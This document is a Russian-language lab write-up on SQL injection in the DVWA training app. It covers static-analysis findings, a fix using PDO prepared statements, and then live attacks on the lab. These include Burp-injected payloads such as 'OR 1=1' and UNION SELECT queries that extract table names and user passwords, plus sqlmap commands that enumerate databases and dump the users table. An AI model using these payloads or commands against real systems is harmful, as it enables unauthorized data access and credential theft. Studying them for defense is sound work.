# Использование статического анализатора кода для обеспечения безопасности
##  Участок кода, содержащий инъекцию SQL
Вредоносное значение может быть присвоено переменной `$id`. И затем с помощью этой переменной формируется SQL запрос:
```php
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $getid );
```
![image](https://user-images.githubusercontent.com/53438664/200193216-cf8858cf-97be-4a39-99bf-c77685f1ead9.png)
**Источники:**
- [OWASP Top 10 2021 Category A3](https://owasp.org/Top10/A03_2021-Injection/ "OWASP Top 10 2021 Category A3") - Injection
- [MITRE, CWE-20](https://cwe.mitre.org/data/definitions/20 "MITRE, CWE-20") - Improper Input Validation
- [MITRE, CWE-89](https://cwe.mitre.org/data/definitions/89 "MITRE, CWE-89") - Improper Neutralization of Special Elements used in an SQL Command

## Кодревью
Сервис статического анализа кода указал следующие проблемы в исследуемом коде:
![image](https://user-images.githubusercontent.com/53438664/200193274-b31845db-07d5-4057-9a2d-93889bdcf6ba.png)

### Не следует использовать символы табуляции
Разработчикам не нужно настраивать ширину вкладок своих текстовых редакторов, чтобы иметь возможность читать исходный код.
### Файлы должны содержать пустую новую строку в конце
Некоторые инструменты работают лучше, когда файлы заканчиваются пустой строкой.
### Исходный код должен соответствовать стандартам форматирования
Общие соглашения о кодировании позволяют команде эффективно сотрудничать. Это правило вызывает проблемы из-за несоблюдения стандарта форматирования. Значения параметров по умолчанию соответствуют стандарту PSR2.


## Исправление кода
### Предотвращение SQL инъекции
Применена технология **PDO**.
> **PDO** (PHP Data Objects — расширение для PHP, предоставляющее разработчику универсальный интерфейс для доступа к различным базам данных).

Принцип работы **PDO** заключается в том, что он отдельно отправляет инструкцию и отдельно данные, строго указывая, что данные это только данные. Другими словами, при привязке параметра через **PDO**, вы сообщаете БД, какие значения использовать при выполнении запроса. Затем **PDO** передаст значение уже скомпилированной инструкции.

Разница между параметрами привязки и простой старой строковой инъекцией заключается в том, что в первом случае значение не интерполируется, а скорее присваивается. Во время выполнения СУБД находит заполнитель и запрашивает значение для использования. Таким образом, нет никаких шансов, что кавычки или другие гадости проберутся в фактическое утверждение.
```php
$db = new PDO('mysql:host=localhost;dbname=dvwa', $user, $password);
```

В нашем запросе передаётся переменная `$id`, поэтому этот запрос в обязательном порядке должен выполняться только через подготовленные выражения.
> Подготовленные выражения в PDO - это обычный SQL запрос, в котором вместо переменной ставится специальный маркер - плейсхолдер.

PDO поддерживает именованные плейсхолдеры, для которых порядок не важен.
В данном случае используем именнованный плейсхолдер `:id`:
```php
$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT);
$data->execute();
```
Добавлена проверка вводимого значения `$id` с помощью функции `is_numeric()`, для установления соответсивия типа числовому значению.
### Стандартизация кода
Убраны "запахи кода" в соответсвии со стандартом PSR2. PSR-2 – Рекомендации по оформлению кода.
> Цель данных рекомендаций – снижение сложности восприятия кода, написанного разными авторами; она достигается путём рассмотрения серии правил и ожиданий относительно форматирования PHP-кода.

### Результаты
![Результаты проверки кода после исправления](https://user-images.githubusercontent.com/53438664/200193379-ddd3e374-3239-47e5-b33f-181d0f8718c7.png "Результаты проверки кода после исправления")

## Burp
Настроив Burp и включив прокси в браузере при помощи предустановленных расширений мы можем начать перехватывать запросы из браузера.
В Burp Suite, можно увидеть перехваченные данные:
![image](https://user-images.githubusercontent.com/53438664/205754746-6ffa6a21-fe36-42ad-9f77-51b04c0fb191.png)

Заменим `id=1` на `id=1 OR 1=1#` (с использованием URL-encode), в ответ получим всех пользователей:

![image](https://user-images.githubusercontent.com/53438664/205754589-c2213481-1d0f-4fd0-b60f-fbb32fe6871c.png)

Произведём следующую инъекцию:
```
id=1 UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
```
В ответ получим названия таблиц:

![image](https://user-images.githubusercontent.com/53438664/205755365-b612727e-18a2-404b-9bdb-3f3997e1a662.png)

Произведём следующую инъекцию:
```
id=1 UNION SELECT USER,PASSWORD FROM users#
```
В ответ получим пароли пользователей:

![image](https://user-images.githubusercontent.com/53438664/205756383-f86ea29b-c263-4c10-8d33-91e69c1a3bc1.png)

## SQLMap
Воспользуемся утилитой для поиска уязвимых параметров запроса.
```sh
sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id
```
![image](https://user-images.githubusercontent.com/53438664/205756897-01a9c86b-0c00-46b6-959b-33074863517b.png)

В результате поиска выявлена уязвимость типа _boolean-based blind_ и _time-based blind_ у параметра `id`. 
- **Boolean based Blind SQL Injection** - это техника инъекции, которая заставляет приложение возвращать различное содержимое в зависимости от логического результата (TRUE или FALSE) при запросе к реляционной базе данных.
- **Time based Blind SQL Injection** - SQL-запросы, которые вынуждают базу данных ждать определенное время, прежде чем ответить. Время ответа укажет злоумышленнику, является ли результат запроса истинным или ложным.

Получим список имеющихся баз данных с помощью команды:
```sh
sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id --dbs
```
![image](https://user-images.githubusercontent.com/53438664/205757631-3e26ad8c-e149-4094-a783-f957e27f251d.png)

Получим список имеющихся таблиц базы данных `dvwa` с помощью команды:
```sh
sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id -D dvwa --tables
```
![image](https://user-images.githubusercontent.com/53438664/205757911-51b68d62-c36c-40f0-b10d-d2ff7960e129.png)

Затем получим строки из таблицы `users`:
```sh
sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id -D dvwa -T users --dump
```
![image](https://user-images.githubusercontent.com/53438664/205758686-0ad29754-b1c9-4565-b79d-0731ea3bddbf.png)

В итоге утилита SQLmap осуществила перебор паролей по имеющимся в таблице хэшам, в результате чего вывела и пароли пользователей.
